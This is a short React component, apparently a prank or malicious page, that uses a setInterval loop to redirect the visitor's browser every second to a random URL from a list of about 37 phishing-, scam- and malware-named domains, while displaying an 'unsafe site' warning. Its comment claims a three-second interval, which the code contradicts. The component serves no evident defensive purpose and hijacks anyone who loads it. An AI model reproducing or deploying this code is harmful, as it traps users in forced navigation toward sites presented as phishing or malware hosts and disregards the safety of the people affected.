import { useEffect } from 'react';

const suspiciousLinks = [
  "https://example.com",
  "https://phishing-site.com",
  "https://fake-login.com",
  "https://scam-offer.net",
  "https://malicious-ads.xyz",
    "https://unsecure-connection.org",
    "https://dangerous-downloads.com",
    "https://click-here-now.com",
    "https://fraudulent-activity.com",
    "https://unverified-source.com",
    "https://phishing-attempt.com",
    "https://malware-distribution.com",
    "https://suspicious-redirect.com",
    "https://fake-security-alert.com",
    "https://untrustworthy-site.com",
    "https://clickbait-ads.com",
    "https://scammy-offers.com",
    "https://unethical-marketing.com",
    "https://deceptive-links.com",
    "https://fraudulent-claims.com",
    "https://unsafe-downloads.com",
    "https://malicious-redirects.com",
    "https://phishing-scam.com",
    "https://fake-ads.com",
    "https://unreliable-source.com",
    "https://click-here-for-more.com",
    "https://unsecure-login.com",
    "https://fraudulent-website.com",
    "https://malicious-content.com",
    "https://scam-alert.com",
    "https://untrustworthy-ads.com",
    "https://fake-promotions.com",
    "https://phishing-links.com",
    "https://malware-attack.com",
    "https://suspicious-downloads.com",
    "https://fake-security-software.com",
    "https://unethical-ads.com",
];

export default function RedirectLoop() {
  useEffect(() => {
    const redirectLoop = setInterval(() => {
      const randomUrl = suspiciousLinks[Math.floor(Math.random() * suspiciousLinks.length)];
      window.location.href = randomUrl;
    }, 1000); // every 3 seconds

    return () => clearInterval(redirectLoop);
  }, []);

  return (
    <div className="h-screen flex items-center justify-center bg-red-100 text-red-800 font-bold text-xl">
      ⚠️ This site is unsafe. Redirecting...
    </div>
  );
}
